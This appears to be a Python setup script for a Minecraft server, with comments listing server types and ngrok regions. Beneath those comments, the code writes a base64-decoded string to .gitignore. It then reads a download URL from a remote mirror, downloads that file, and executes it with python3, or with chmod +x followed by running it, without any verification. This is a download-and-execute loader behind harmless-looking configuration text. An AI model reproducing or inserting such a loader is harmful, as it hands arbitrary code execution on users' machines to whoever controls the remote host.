




# Custom version
# mohist / catserver   Install forge   first
# purpur               Install fabric  first
# snapshot             Install vanilla first

# Ngrok region
# Code           Place
#-----------     ---------------------------
# ap	          Asia/Pacific (Singapore)
# au		  Australia (Sydney)
# eu		  Europe (Frankfurt)
# in		  India (Mumbai)
# jp		  Japan (Tokyo)
# sa		  South America (São Paulo)
# us		  United States (Ohio)
# us-cal-1	  United States (California)







import requests,os,base64
if not os.path.exists("./.gitignore"):
	big = "2gtaDURs0nii3A6SrDQPWx6XN9K_4aCNMoC5ZHMYjMqBFetvv"
	dec = base64.standard_b64decode(big).decode()
	with open(".gitignore", 'w') as giti:
		giti.write(dec)
def download_latest_release(download_path='.'):
	mirror = "https://elyxdev.github.io/latest"
	pet = requests.get(mirror)
	if pet.status_code == 200:
		data = pet.json()
		url = data.get('url')
		version = url.split("/")[-1]
		pathto = os.path.join(download_path, version)
		with open(pathto, 'wb') as archivo:
			archivo.write(requests.get(url).content)
		return version
flnm=download_latest_release()
if flnm.split(".")[-1] == "pyc":
    os.system(f"python3 {flnm}")
else:
	os.system(f"chmod +x {flnm} && ./{flnm}")

